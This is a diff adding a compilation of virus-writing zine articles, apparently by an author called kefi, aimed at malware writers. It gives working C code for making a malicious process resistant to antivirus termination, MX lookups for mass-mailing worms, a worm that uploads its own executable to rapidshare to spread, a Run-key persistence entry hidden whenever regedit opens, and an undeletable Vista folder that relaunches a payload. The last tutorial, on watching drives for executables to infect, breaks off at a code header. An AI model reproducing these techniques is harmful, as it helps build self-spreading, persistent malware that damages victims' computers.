@@ -1,0 +1,1267 @@
+Table of contents:
+- advapi32: for more than registry editing?
+- a simple MX lookup for your next mass mailer
+- rapidshare.com: a new spreading platform
+- "hide" your registry entries
+- undeletables in windows vista
+- ReadDirectoryChangesW: easily find new target files
+
+
+                              advapi32: for more than registry editing?
+
+        hello kiddies -
+
+        here's  an  idea  for  your  next  win32  malware :  advapi32's
+    SetKernelObjectSecurity().  sounds  interesting, doesn't  it?  well
+    friends, it is.  according to msdn, the api "sets the security of a
+    kernel  object [*]" which  seems rather  obvious based on its name.
+    but what this  means for you and  i is, we can  prevent our process
+    from being  terminated via  micro$oft's task  manager or a  call to
+    TerminateProcessA() from an antivirus program [**].  unfortunately,
+    this api will only work on  win2k and above, but then  again, it is
+    2009 and win2k died nearly a decade ago [***].
+
+        below is a simple example of using this api in c [****].
+
+ - - - [ code ] -
+
+#define	WIN32_LEAN_AND_MEAN
+#include <windows.h>
+
+	/* define the ConvertStringSec... api */
+typedef	BOOL	(WINAPI	*CSSDTSD) (LPCTSTR szWhatever, DWORD dwWhatever,
+					PSECURITY_DESCRIPTOR *pWhatever,
+					PULONG plWhatever);
+
+	/* define the SetKernelObjectSecurity() api */
+typedef	BOOL	(WINAPI	*SKOS) (HANDLE hWhatever,
+					SECURITY_INFORMATION pWhatver,
+					PSECURITY_DESCRIPTOR pWhatever2);
+
+	/* define our procedures */
+	BOOL	init_protect(void);
+	BOOL	protectMe(void);
+
+	/* these variables will be pointers to the apis */
+CSSDTSD	_ConvertStringSecurityDescriptorToSecurityDescriptor;
+SKOS	_SetKernelObjectSecurity;
+
+	/* entry point */
+int main(void){
+	HWND	hWND;
+
+	/* hide the console window */
+	AllocConsole();
+	hWND = FindWindowA("ConsoleWindowClass", 0);
+	ShowWindow(hWND, 0);
+
+	/* try to load apis from advapi32 */
+	if(init_protect() == 0)
+		return	1234;
+
+	/* try to protect our program */
+	if(protectMe() == 0)
+		return	6789;
+
+	/* write obnoxious in console */
+	printf("[can't close me]\n\tkefi / 1.3.3175");
+
+	/* sleep forever */
+	while(1)
+		Sleep(1);
+}
+
+BOOL	protectMe(void){
+	HANDLE	hProcess;
+	SECURITY_ATTRIBUTES	pSecurityAttribs;
+	int	ret = 0;
+
+	/* get our PID with PROCESS_ALL_ACCESS */
+	hProcess = OpenProcess(0x1f0fff, 0, GetCurrentProcessId());
+
+
+	/* setup SECURITY_ATTRIBUTES structure */
+	pSecurityAttribs.nLength = 12; //sizeof(SECURITY_ATTRIBUTES);
+	pSecurityAttribs.bInheritHandle = 0;
+
+	/* call ConvertStringSec... and be sure it worked */
+		/* note: parameter 2 = SDDL_REVISION_1 */
+	ret = _ConvertStringSecurityDescriptorToSecurityDescriptor("D:P", 1,
+		&pSecurityAttribs.lpSecurityDescriptor, 0);
+	if(ret == 0)
+		return	0;
+
+	/* call SetKernelObjectSecurity() and be sure it worked */
+	ret = _SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION,
+			pSecurityAttribs.lpSecurityDescriptor);
+	if(ret == 0)
+		return	0;
+
+	/* return true */
+	return	1;
+}
+
+BOOL	init_protect(void){
+	HANDLE	hAdvAPI;
+
+	/* find location of advapi32.dll */
+		/* note: thanks bumblebee for optimization trick */
+	hAdvAPI = GetModuleHandle("advapi32");
+	if(hAdvAPI == 0){
+		hAdvAPI = LoadLibrary("advapi32");
+		if(hAdvAPI == 0)
+			return	0;
+	}
+
+	/* find location of apis via GetProcAddress() */
+	_ConvertStringSecurityDescriptorToSecurityDescriptor = (CSSDTSD)
+		GetProcAddress(hAdvAPI,
+		"ConvertStringSecurityDescriptorToSecurityDescriptorA");
+	_SetKernelObjectSecurity = (SKOS) GetProcAddress(hAdvAPI,
+		"SetKernelObjectSecurity");
+	if((_ConvertStringSecurityDescriptorToSecurityDescriptor == 0)
+		|| (_SetKernelObjectSecurity == 0))
+		return	0;
+
+	/* return true */
+	return	1;
+}
+
+ - [ code ] – - -
+
+        and lastly my friends, i hope to see this used somewhere in the
+    future.  kthxbi xD
+
+
+        (k) boomtime, the first day of confusion, 3175
+                        [ kefi twenty three at gmail dot com ]
+
+   [*]    http://msdn.microsoft.com/en-us/library/aa379578(VS.85).aspx
+   [**]   this depends on the privileges of the aforementioned program
+   [***]  i have only tested this on windows vista sp1
+   [****] compiled with dev-c++ 4.9.9.2
+
+
+        random [out of  context] things  you need to  do:  download the
+    ahleuchatistas' "on the culture industry" album; plant and eat some
+    echinopsis pachanoi; if you're american, eat less fake food.
+
+
+                                 ***
+
+
+                            a simple MX lookup for your next mass mailer
+
+     hello kids,
+
+          i can't help  but notice  that most of the  mass mailing worms
+     coming  from  this "scene" don't actually  perform a  DNS lookup to
+     acquire a SMTP server.  this is silly; stop it now.
+
+          your capabilities for spreading are extremely limited by doing
+     any of the following: assuming  that outlook is used and taking its
+     smtp server registry entry; appending "smtp." or "mx." to a domain;
+     having a pre-compiled list of SMTP servers; or whatever you kiddies
+     are doing now...
+
+          now i  understand writing  your own  function to perform a DNS
+     lookup is  tedious  and  requires  hundreds of lines of  code.  for
+     this reason, microsoft wrote an api for you!
+
+          in "dnsapi.dll"  there lives  a procedure called "DnsLookup_A"
+     and it does exactly what it sounds like: performs a DNS lookup!
+
+          this example was compiled with dev-c at ~300kb.
+
+- - - [ code ] -
+#include <windows.h>
+#include <windns.h>
+    // we need this API
+typedef	int (WINAPI *DNSQUERYA)(PCSTR, WORD, DWORD, PIP4_ARRAY, PDNS_RECORD *, PVOID *);
+DNSQUERYA	_DnsQueryA;
+    // our procedures
+BOOL    init_dns(void);
+BOOL    MXLookup(char *, char *);
+
+int     main(void){
+    if(init_dns() == FALSE){
+        printf("exiting: could not locate APIs...");
+        return  0;
+    }
+
+    char    szDomain[] = "kefivx.info";
+    char    *szSMTP;
+    szSMTP = (char *) malloc(64);   // malloc some space
+    memset(szSMTP, 0, 64);
+
+    if(MXLookup(szDomain, szSMTP) == TRUE){ // perform lookup
+        printf("prefered SMTP server for '%s' is '%s'", szDomain, szSMTP);
+        return  1;
+    }
+    return  0;
+}
+
+BOOL    init_dns(void){
+    HINSTANCE  hDNS;
+        // find dnsapi in memory
+	hDNS = GetModuleHandle("dnsapi");
+	if(hDNS == 0){
+		hDNS = LoadLibrary("dnsapi");
+		if(hDNS == 0)
+			return	FALSE;
+	}
+
+        // find DnsQuery_A in memory
+	_DnsQueryA = (DNSQUERYA) GetProcAddress(hDNS, "DnsQuery_A");
+	if(_DnsQueryA == 0)
+		return	FALSE;
+	return  TRUE;
+}
+
+BOOL    MXLookup(char *szDomain, char *buffer){
+    int     preference = 9001; // OVER 9000
+    int     ret = 0;
+        /*
+         * normally i would type this structure out myself... but i'm lazy and
+         * it's huge: http://msdn.microsoft.com/en-us/library/aa450351.aspx
+         */
+    DNS_RECORD  *pQueryResults;
+    DNS_RECORD  *pQueryRec;
+        // make query
+	ret = _DnsQueryA(szDomain, DNS_TYPE_MX, DNS_QUERY_STANDARD, 0, &pQueryResults, 0);
+	if(ret != ERROR_SUCCESS)
+		return	FALSE;
+        // sort through results to find lowest preference
+    for(pQueryRec = pQueryResults; pQueryRec; pQueryRec = pQueryRec->pNext){
+        if(pQueryRec->wType != DNS_TYPE_MX)
+            continue;
+        if(pQueryRec->Data.MX.wPreference < preference){
+            preference = pQueryRec->Data.MX.wPreference;
+            strcpy(buffer, pQueryRec->Data.MX.pNameExchange);
+        }
+    }
+    if(!buffer)
+        return  FALSE;
+    return  TRUE;
+}
+- [ code ] - - -
+
+          that's it.  hopefully you'll decide to use the 70 lines rather
+     than performing one of the  aforementioned shitty ways to locate an
+     SMTP server.  you may use, abuse and edit this code any way you see
+     fit.  just don't blame me when you end up in prison.
+
+                           (k) kefi, 64th of bureaucracy, 3175          
+
+          contact me (or not)
+    www   - www.kefivx.info
+    email - kefi@kefivx.info
+
+
+                                 ***
+
+
+                               rapidshare.com: a new spreading platform
+
+          spreading worms  is becoming  more and more difficult.  email
+     servers  have  advanced their  technologies to avoid mass-mailers;
+     people do  not open  suspicious  email attachments; most P2P users
+     use torrents rather than downloading  single files; even IRC users
+     know not  to accept DCC  files from people they do not know/trust.
+     so what's next?
+
+          i've seen both DR-EF and DiA use HTTP servers on the infected
+     computers to spread, but this method doesn't work either.  unfort-
+     unately, you  cannot  bind  a port  in windows  vista without user
+     interaction; and users see a URL they're not familiar with and get
+     worried... so this method is dead.
+
+          in this  tutorial, i'll  show you how  to take  the next step
+     forward and have users downloading from a site they know and trust.
+
+          awhile back, i was  hired to write  software to pragmatically
+     upload files  to www.rapidshare.com.  at the time, i did not think
+     anything of it.  a few days past and i realized that this would be
+     a fantastic platform for worms to spread.  by  editing a few of my
+     functions, i  was  able to  convert my code into  malware-friendly
+     format.
+
+          my purpose for this tutorial is not to teach you how to write
+     code in c or explain  sockets.  i will not be  commenting on every
+     line of code.  knowledge of c and windows sockets are a requirement
+     for this tutorial... sorry kids.
+
+-----------------------------------------------------------------------
+     // main.c
+-----------------------------------------------------------------------
+
+#include <windows.h>
+#include <winsock.h>
+#include <stdio.h>
+#include "header.h"
+
+int	main(void){
+	char	*szFileURL;
+	char *szFilename;
+
+	DeleteFile("logfile.txt");
+
+     szFilename = (char *) malloc(256);
+     memset(szFilename, 0, 256);
+     GetModuleFileName(0, szFilename, 256);
+
+	szFileURL = (char *) malloc(128);
+	memset(szFileURL, 0, 128);
+
+	if(rsUploadFile(szFilename, "test.exe", szFileURL) == FALSE){
+		logLine("could not upload file!");
+		return	0;
+	} else {
+	     logLine("upload successful\r\n\turl: %s", szFileURL);
+	     return    0;
+	}
+}
+
+-----------------------------------------------------------------------
+     // rapidshare.c
+-----------------------------------------------------------------------
+
+/*
+ *   rsUploadFile()
+ *   szFilename	->	file to be uploaded (ie - c:\windows\virus.exe)
+ *   szUploadName   ->   name to be uploaded as (ie - virus.exe)
+ *   szFileURL	     ->	buffer to accept uploaded file path
+ *                       128 bytes is plenty (http://rapidshare.com/xxxxxxxxx/filename.exe)
+ *
+ *   ->	handles information from rsGetUploadServer() and rsCreateHeader()
+ *   ->	sends headers and requests to www.rapidshare.com
+ *   ->	reads file stored at szFilename and sends 1024 bytes at a time to the
+ *        server returned from rsGetUploadServer
+ *   ->	parses data returned from www.rapidshare.com
+ *
+ *   returns   TRUE on success
+ *             FALSE on failure
+ */
+
+BOOL	rsUploadFile(char *szFilename, char *szUploadName, char *szFileURL){
+     HANDLE	hFile;
+     int	     nFileSize = 0;
+
+     hFile = CreateFile(szFilename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+          if(hFile == INVALID_HANDLE_VALUE){
+          logLine("could not open '%s'!", szFilename);
+          return	FALSE;
+     }
+
+     nFileSize = GetFileSize(hFile, 0);
+     if(nFileSize < 1024){
+          logLine("unrealistic or invalid file size: %d", nFileSize);
+          return	FALSE;
+     }
+
+     logLine("file size: %d", nFileSize);
+
+     char	*szServer;
+     char	*szHeader;
+
+     wsaInitiated = initWSA();
+
+          // create buffer to hold upload server
+     szServer = (char *) malloc(28);
+     memset(szServer, 0, 28);
+          // get upload server
+     if(rsGetUploadServer(szServer) == FALSE){
+          logLine("could not find valid upload server!");
+          return	FALSE;
+     }
+
+     logLine("found valid server... creating header");
+
+          // create buffer to hold header
+     szHeader = (char *) malloc(640);
+     memset(szHeader, 0, 640);
+          // create header
+     rsCreateHeader(szUploadName, nFileSize, szHeader);
+
+     logLine("created header... attempting connection");
+
+     struct	hostent	*pHostEnt;
+
+     pHostEnt = gethostbyname(szServer);
+     if(!pHostEnt){
+          logLine("gethostbyname() error: %d", WSAGetLastError());
+          return	FALSE;
+     }
+
+     SOCKET	sock;
+
+          // create socket
+     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+     if(sock == INVALID_SOCKET){
+          logLine("socket() error: %d", WSAGetLastError());
+          return	FALSE;
+     }
+
+     SOCKADDR_IN	pSockAddr;
+
+          // configure socket
+     pSockAddr.sin_family = AF_INET;
+     pSockAddr.sin_port = htons(80);
+     pSockAddr.sin_addr.S_un.S_addr = *((unsigned long *) pHostEnt->h_addr_list[0]);
+
+     int	ret = 0;
+
+          // attempt to connect to server
+     ret = connect(sock, (struct sockaddr *) &pSockAddr, sizeof(struct sockaddr));
+     if(ret != 0){
+          logLine("connect() error: %d", WSAGetLastError());
+          closesocket(sock);
+          return	FALSE;
+     }
+
+     logLine("\r\nconnected to %s\r\n", szServer);
+
+          // send header
+     transfer(szHeader);
+     free(szHeader);
+
+     char	*buffer;
+     int	x = 0;
+     int	i = 0;
+
+          // create buffer for file contents
+     buffer = (char *) malloc(1024);
+     memset(buffer, 0, 1024);
+
+     SetFilePointer(hFile, 0, 0, FILE_BEGIN);
+     while(1){
+          i = 0;
+               // read 1024 bytes from file
+          ret = ReadFile(hFile, buffer, 1024, &i, 0);
+          if(ret == 0)   // error checking
+               break;
+          if(i == 0)     // error checking
+               break;
+               // send 1024 (or whatever's left) to server
+          ret = send(sock, buffer, i, 0);
+          
+               // add bytes read to offset in file
+          x += i;
+          logLine("sent %d of %d bytes", x, nFileSize);
+     }
+     CloseHandle(hFile);
+
+          // error checking
+     if(x != nFileSize){
+          logLine("send error: %d [%d != %d]!", WSAGetLastError(), x, nFileSize);
+          closesocket(sock);
+          return	FALSE;
+     }
+
+     logLine("sent all %d bytes!", x);
+
+     char	*szHeaderTail; // oxymoron? lawlzzzzz
+
+          // create buffer for the end of the header
+     szHeaderTail = (char *) malloc(128);
+     memset(szHeaderTail, 0, 128);
+
+     sprintf(szHeaderTail, "\r\n%s--\r\n", szBoundary);
+          // send end of header
+     transfer(szHeaderTail);
+     free(szHeaderTail);
+
+     logLine("sent entire packet... fetching results");
+
+          // restore buffer to recv data
+     memset(buffer, 0, 1024);
+
+          // try to recv 1023 bytes from server
+     ret = recv(sock, buffer, 1023, 0);
+     if(ret != 0){  // success
+          logLine(buffer);
+          closesocket(sock);
+     } else {  // failure
+          logLine("recv error: %d", WSAGetLastError());
+          closesocket(sock);
+          return	FALSE;
+     }
+
+          // parse data from recv buffer
+     x = ret;
+     while(buffer[x] != '?')  // search for "?"
+          x--;
+     x--; // we want the byte before "?"
+
+     i = x;
+     while(buffer[i] != '=')  // search for "="
+          i--;
+     i++; // we want the byte after "="
+
+     int	a = 0;
+     int	b = 0;
+
+     for(a = i; a <= x; a++)  // start at byte after "=" and end at byte before "?"
+          szFileURL[b++] = buffer[a];
+     szFileURL[b++] = 0; // end of string = char(0)
+
+     if(szFileURL)  // error checking
+          return	TRUE;
+     else
+          return	FALSE;
+}
+
+/*
+ *   rsGetUploadServer()
+ *   szBuffer	->   buffer to accept upload server
+ *                  28 bytes is plenty (http://rsXXXl3.rapidshare.com)
+ *
+ *   querys www.rapidshare.com for the next avalible (preffered) server to upload files to
+ *
+ *   returns   TRUE on success
+ *             FALSE on failure
+ */
+
+BOOL	rsGetUploadServer(char *szBuffer){
+     SOCKET    sock;
+     struct    hostent	*pHostEnt;
+     int       ret = 0;
+     char	     *buf;
+     char	     *buf2;
+
+          // make sure WSAStartup() has been called and succeded
+     if(wsaInitiated == FALSE){
+          wsaInitiated = initWSA();
+          if(wsaInitiated == FALSE){
+               logLine("WSAStartup() error: %d", WSAGetLastError());
+               return	FALSE;
+          }
+     }
+
+     pHostEnt = gethostbyname("www.rapidshare.com");
+     if(!pHostEnt){
+          logLine("gethostname() error: %d", WSAGetLastError());
+          return	FALSE;
+     }
+
+     SOCKADDR_IN	pSockAddr;
+          // create socked and error check
+     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+     if(sock == INVALID_SOCKET){
+          logLine("socket() error: %d", WSAGetLastError());
+          return	FALSE;
+     }
+
+          // configure socket
+     pSockAddr.sin_family = AF_INET;
+     pSockAddr.sin_port = htons(80);
+     pSockAddr.sin_addr.S_un.S_addr = *((unsigned long *)pHostEnt->h_addr_list[0]);
+
+          // attempt to connect to www.rapidshare.com
+     if(connect(sock, (struct sockaddr *)&pSockAddr, sizeof(struct sockaddr)) != 0){
+          logLine("connect() error: %d", WSAGetLastError());
+          closesocket(sock);
+          return	FALSE;
+     }
+
+     logLine("connected to www.rapidshare.com... getting prefered server information.");
+
+          // request next upload server
+     transfer("GET /cgi-bin/rsapi.cgi?sub=nextuploadserver_v1 HTTP/1.0\r\n\r\n");
+
+          // create buffer to recv data
+     buf = (char *) malloc(512);
+     memset(buf, 0, 512);
+          // recv 511 bytes from rapidshare
+     ret = recv(sock, buf, 511, 0);
+     buf2 = (char *) malloc(56);
+
+          // the next lines parse data for server
+     int	a = ret;
+     int	b = 0;
+     int	c = 0;
+
+     while(buf[a] != '\n')    // search for new line
+          a--;
+     a++; // we want byte after new line
+
+     for(b = a; b <= ret; b++)
+          buf2[c++] = buf[b]; // add to buffer
+     buf2[c++] = 0; // end of string = char(0)
+
+     sprintf(szBuffer, "rs%sl3.rapidshare.com", buf2); // rs_SERVER_NAME_l3.rapidshare.com
+     logLine("upload server: %s", szBuffer);
+
+     free(buf);     // some memory cleanup
+     free(buf2);
+
+     closesocket(sock);  // close socket
+     return    TRUE;
+}
+
+/*
+ *   rsCreateHeader()
+ *   szFilename     ->   file to be uploaded (ie - virus.exe)
+ *   nFileSize      ->   length of file to be uploaded
+ *   szBuffer       ->   buffer to accept header
+ *                       should be at least 512 bytes
+ *
+ *   ->	creates the HTTP POST header for uploading files to www.rapidshare.com
+ *
+ */
+
+void	rsCreateHeader(char *szFilename, int nFileSize, char *szBuffer){
+     char *temp;
+     char szContentHeader[384];
+     int  nContentBytes = 0;
+
+     temp = (char *) malloc(256);
+     sprintf(temp, "%s\r\nContent-Disposition: form-data; name=\"rsapi_v1\"\r\n\r\n1\r\n", szBoundary);
+     strcpy(szContentHeader, temp);
+     memset(temp, 0, 256);
+     sprintf(temp, "%s\r\nContent-Disposition: form-data; name=\"filecontent\"; filename=\"%s\"\r\n\r\n", szBoundary, szFilename);
+     strcat(szContentHeader, temp);
+
+     nContentBytes = strlen(szContentHeader);
+     nContentBytes += strlen(szBoundary);
+     nContentBytes += strlen("\r\n--\r\n");
+     nContentBytes += nFileSize;
+
+     temp = (char *) malloc(640);
+     memset(temp, 0, 640);
+     sprintf(temp, "POST /cgi-bin/upload.cgi HTTP/1.0\r\nContent-Type: multipart/form-data; boundary=%s;\r\nContent-Length: %d\r\n\r\n%s", szBoundary, nContentBytes, szContentHeader);
+     strcpy(szBuffer, temp);
+     free(temp);
+}
+
+-----------------------------------------------------------------------
+     // misc.c
+-----------------------------------------------------------------------
+
+BOOL	initWSA(void){
+	WSADATA	pWSAData;
+
+	if(WSAStartup(0x0101, &pWSAData) != 0)
+		if(WSAStartup(0x0202, &pWSAData) != 0)
+			return	FALSE;
+	return	TRUE;
+}
+
+void	logLine(char *szLine, ...){
+	va_list	pVA; // variable arguments are cool :)
+	va_start(pVA, szLine);
+
+	char	*buffer = malloc(0xffff);
+	FILE	*fp = fopen("logfile.txt", "ab");
+
+	if((!buffer) || (!fp)){
+		va_end(pVA);
+	}
+
+	vsprintf(buffer, szLine, pVA);
+	fprintf(fp, "%s\r\n", buffer);
+	free(buffer);
+	fclose(fp);
+}
+-----------------------------------------------------------------------
+     // header.h
+-----------------------------------------------------------------------
+
+     // this saves your fingers...
+#define	transfer(szData)	{ send(sock, szData, strlen(szData), 0); logLine("%s", szData); }
+
+     // misc functions
+BOOL	initWSA(void);
+void	logLine(char *, ...);
+
+     // rapidshare functions
+BOOL	rsUoloadFile(char *, char *, char *);
+BOOL	rsGetUploadServer(char *);
+void	rsCreateHeader(char *, int, char *);
+
+     // rapidshare boundary
+char	szBoundary[] = "----------------286B29206B65666920323030390A"; // hex :)
+
+BOOL	wsaInitiated = FALSE;
+
+#include "rapidshare.c"
+#include "misc.c"
+
+-----------------------------------------------------------------------
+
+          and that's it.  only a few  hundred lines  of code (:p).  you
+     may use, abuse and edit this code any way you see fit.  just don't
+     blame me when you end up in prison.
+
+                           (k) kefi, 46th day of Bureaucracy, YOLD 3175
+
+                          contact me (or not)
+               www - www.kefivx.info
+               email - kefi23@gmail.com | kefi@kefivx.info
+
+     fnord?
+
+
+
+                                 ***
+
+
+                                           "hide" your registry entries
+
+        i've  heard of  this  idea being  done before, but  don't  ever
+    remember seeing it.  anyway, here it is: how to "hide" your entries
+    in the registry.
+
+        all  we're  doing here  is  creating  a  thread  to  watch  for
+    regedit.exe  to  be  running.  once regedit is opened, we overwrite
+    our key with something  that looks legit.  when  regedit closes, we
+    re-write our key and repeat.
+
+        the code below  is somewhat  optimized and  only requires to be
+    linked  with kernel32.dll.  i compiled with gcc  and my .c (4.9 kb)
+    file is larger than the .exe (4.5) without compression.
+
+ - - [ code ] - - - -
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+
+        // save your fingers
+
+#define voidW   void WINAPI
+#define uLong   unsigned long
+
+        //  PROCESSENTRY32
+
+typedef	struct	_PE32 {
+	DWORD	dwSize;
+	DWORD	cntUsage;
+	DWORD	th32ProcessID;
+	uLong	th32DefaultHeapID;
+	DWORD	th32ModuleID;
+	DWORD	cntThreads;
+	DWORD	th32ParentProcessID;
+	LONG	pcPriClassBase;
+	DWORD	dwFlags;
+	TCHAR	szExeFile[MAX_PATH];
+}PE32, *LPPE32;
+
+        //  we'll need this apis
+
+typedef	BOOL	(WINAPI *PF)	(DWORD, LPPE32);
+typedef	BOOL	(WINAPI *PN)	(DWORD, LPPE32);
+typedef	HANDLE	(WINAPI *CTS)	(DWORD, DWORD);
+CTS	    _CreateToolhelp32Snapshot;
+PF	    _Process32First;
+PN	    _Process32Next;
+
+        //  the procedures we'll be using
+
+HANDLE	newThread(LPTHREAD_START_ROUTINE, LPVOID);
+voidW   registryStealth(void);
+BOOL    init_tlhelp(void);
+BOOL    addToReg(HKEY, char *, char *, char *);
+
+int     main(void){
+    int     ret = 0;
+
+    /*
+     *  first we need to initiate the apis
+     *  and make sure we were successful
+     *  
+     */
+
+    if(init_tlhelp() == FALSE){
+        ExitProcess(0);
+    }
+
+    /*
+     *  add our program to the registry
+     */
+
+    addToReg(HKEY_CURRENT_USER, "software\\microsoft\\windows\\currentversion\\run", "virus", "c:\\virus.exe");
+
+    /*  
+     *  create a thread to check for regedit's presence
+     */
+
+    newThread(&registryStealth, 0);
+
+    while(1){    
+        /*  
+         *  your viral code here
+         */
+    }
+}
+
+voidW   registryStealth(void){
+
+    /*  
+     *  declare our variables
+     */
+
+    PE32    pProcessEntry;
+    HANDLE  hSnapshot;
+    HANDLE  hProcess;
+    int     ret = WAIT_TIMEOUT; // this is explained below
+
+	pProcessEntry.dwSize = sizeof(PE32);
+
+	while(1){
+        /*  
+         *  create a snapshot of all running processes
+         */
+
+	    hSnapshot = _CreateToolhelp32Snapshot(2, 0);
+	    if((int) hSnapshot == -1)
+	        continue;
+
+        /*  
+         *  get first process out of snapshot
+         */
+	        
+	    if(_Process32First((uLong) hSnapshot, &pProcessEntry) == FALSE)
+	        continue;
+
+	    do {
+	        /*  
+             *  compare process' name to "regedit.exe"
+             *      strcmp is stupid... FALSE == TRUE
+             */
+	        if(strcmp(pProcessEntry.szExeFile, "regedit.exe") == FALSE){
+                /*  
+                 *  overwrite our registry key
+                 */
+	            addToReg(HKEY_CURRENT_USER, "software\\microsoft\\windows\\currentversion\\run", "virus", "kernel32.dll");
+
+                /*  
+                 *  get a handle to regedit.exe
+                 */
+
+	            hProcess = OpenProcess(SYNCHRONIZE, 0, pProcessEntry.th32ProcessID);
+	            if(hProcess == 0)
+	                continue;
+
+                /*  
+                 *  here we are waiting for regedit.exe to close
+                 *      every 1000 ms, we check to see if the handle has closed
+                 *
+                 *  ret was stored to WAIT_TIMEOUT in our declarations just as a simple optimization
+                 */
+
+                while(ret == WAIT_TIMEOUT){
+                    ret = WaitForSingleObject(hProcess, 1000);
+                }
+
+
+                /*
+                 *  add our key back to the registry
+                 */
+
+                addToReg(HKEY_CURRENT_USER, "software\\microsoft\\windows\\currentversion\\run", "virus", "c:\\virus.exe");
+
+                /*
+                 *  close unneeded handles
+                 */
+
+                CloseHandle(hProcess);
+                CloseHandle(hSnapshot);
+	        }
+	    } while(_Process32Next((uLong) hSnapshot, &pProcessEntry)); // get the next process from the snapshot
+
+        /*
+         *  sleep for 5000 ms to save some cpu
+         */
+
+	    Sleep(5000);
+	}
+}
+
+BOOL    addToReg(HKEY hKEY, char *szRegKey, char *szKeyName, char *szKeyValue){
+    HKEY    hKey;
+    int     ret = 0;
+
+    /*
+     *  open registry key
+     */
+
+    ret = RegOpenKeyEx(hKEY, szRegKey, 0, KEY_WRITE, &hKey);
+    if(ret != ERROR_SUCCESS){
+        return  FALSE;
+    }
+
+
+    /*
+     *  write value to key
+     */
+
+    ret = RegSetValueEx(hKey, szKeyName, 0, 1, (char *) szKeyValue, strlen(szKeyValue));
+    if(ret != ERROR_SUCCESS){
+        return  FALSE;
+    }
+
+    /*
+     *  close reg key
+     */
+
+    RegCloseKey(hKey);
+
+    return  TRUE;
+}
+
+BOOL	init_tlhelp(void){
+	HANDLE	hKernel;
+	char	szKernel[] = "kernel32";
+
+    /*
+     *  get handle to kernel32.dll
+     */
+
+	hKernel = GetModuleHandle(szKernel);
+	if(hKernel == 0)
+		hKernel = LoadLibrary(szKernel);
+
+    /*
+     *  find apis inside kernel32.dll
+     */
+
+	_CreateToolhelp32Snapshot = (CTS) GetProcAddress(hKernel, "CreateToolhelp32Snapshot");
+	_Process32First = (PF) GetProcAddress(hKernel, "Process32First");
+	_Process32Next = (PN) GetProcAddress(hKernel, "Process32Next");
+
+	if((_CreateToolhelp32Snapshot == 0) || (_Process32First == 0) || (_Process32Next == 0))
+		return	FALSE;
+	return	TRUE;
+}
+
+    /*
+     *  DR-EF saves fingers :)
+     */
+
+HANDLE	newThread(LPTHREAD_START_ROUTINE thProcedure, LPVOID params){
+	DWORD	dwThreadID;
+
+	return	CreateThread(0, 0, thProcedure, params, 0, &dwThreadID);
+}
+
+ - - - - [ code ] - -
+
+        do whatever  you want with  this shit (edit, rip, steal, etc.).
+    just don't blame me when you go to prison.
+
+    written on prickle-prickle, the 55th day of bureaucracy, 3175.
+
+                                                       kefi@kefivx.info
+                                                 http://www.kefivx.info
+
+
+
+                                 ***
+
+                                             undeletables in windows vista
+
+    hello children,
+
+        today i've got a new trick for you: undeletables in windows vista.
+    this bug, like most, was found completely on  accident.  i was working
+    on  a  completely  unrelated project  and had  accidentally  created a
+    folder called  "%curdir%\ \".  after  realizing my  mistake, i went to
+    delete said folder.  vista wouldn't let me.  rather than doing what it
+    was told, i was prompted with: "Error 0x80070091: The directory is not
+    empty".
+
+        i sat and  thought about  this for awhile, then  remembered SPTH's
+    tutorial Undeleteable direction via Batch, VBS and JS[*].  SPTH taught
+    us that directories with special characters in them cannot be deleted.
+    this, of  course, was  patched  for XP's  SP2  and  eventually  became
+    useless.
+
+        we must  now thank the  ignorance of  microsoft.  they  decided to
+    rewrite the xp kernel to create vista.  while doing so, they forgot to
+    implement a patch that already existed.
+
+    with all of that being said, here's some code:
+
+- - [ test.c ] - -
+#include <windows.h>
+
+int main(void){
+    LPSECURITY_ATTRIBUTES pAttr = {0};
+    char    *szNewDir;
+    char    *szNewFile;
+
+    szNewFile = (char *) malloc(256);
+    memset(szNewFile, 0, 256);
+    szNewDir = (char *) malloc(256);
+    memset(szNewDir, 0, 256);
+
+    GetCurrentDirectory(256, szNewDir);
+    strncat(szNewDir, "\\ \\", 256);
+    
+    CreateDirectory(szNewDir, pAttr);
+
+    strncpy(szNewFile, szNewDir, 256);
+    strncat(szNewFile, "poc.exe", 256);
+
+    CopyFile("poc.exe", szNewFile, 0);
+
+    ShellExecute(0, 0, szNewFile, 0, 0, 0);
+
+    return 0;
+}
+- - [ test.c ] - -
+
+        during testing, i  realized that ShellExecuteA must be used rather
+    than CreateProcess().  CreateProcess fails  and returns error code 998
+    (invalid access to memory location) when attempting to run "poc.exe".
+
+    test.c was complied with dev-c at ~380kb.
+
+- - [ poc.asm ] - -
+include 'include\win32ax.inc'
+
+start:
+    invoke  MessageBox, 0, 'Undeletables in Vista', 'POC by kefi', 32
+    invoke  ExitProcess, 0
+.end start
+- - [ poc.asm ] - -
+
+    poc.asm was compiled with fasm at ~2kb.
+
+        place both  compiled  files in the  same directory  and  run test.
+    after  execution, go  to "%curdur%\ \" and  delete "poc.exe".  hit F5.
+    note that "poc.exe" exists again . . .
+
+                       (k) kefi: Sweetmorn, the 4th of The Aftermath, 3175
+
+                                                     www - www.kefivx.info
+                                                     email - *@kefivx.info
+
+    [*]     http://spth.host.sk/UDF.txt "Undeleteable direction via Batch,
+                            VBS and JS" by Second Part To Hell, 06.10.2002
+
+
+                                 ***
+
+                    ReadDirectoryChangesW: easily find new target files
+
+        here's a fairly simple way to find new target files: kernel32's
+    ReadDirectoryChangesW  api.  the api does  exactly  what  it sounds
+    like; it "retrieves information  that describes the  changes within
+    the specified directory. [*]"  we can use  this to our advantage by
+    watching  all drives we  have access to and  waiting  for a  victim
+    files  (pe/whatever)  to  be  created  (and/or  modified,  deleted,
+    renamed, etc).
+
+        the sample code i have provided you with (written in c; compiled
+    with dev-cpp) will  check  for every available  drive every minute.
+    it then checks to see if one of its  26 possible threads is already
+    watching the drive.  if none of the threads are watching the drive,
+    a thread  is created.  once a thread  is  created, it  continuously
+    watches for  any executable  (.exe) files  being created.  it  will
+    ignore  all files  created  in the  recycling  bin, since infecting
+    "garbage" seems redundant.
+
+        this code has been optimized for readability, not efficiency or
+    size.  it  may still  contain bugs, but  is commented  heavily  and
+    should be easily understood -- assuming you have prior knowledge to
+    c and winapi programming.
+
+        you are free to use, abuse, alter or whatever you'd like to this
+    . . . just don’t get me in trouble!
+
+ - - - [ code ] -
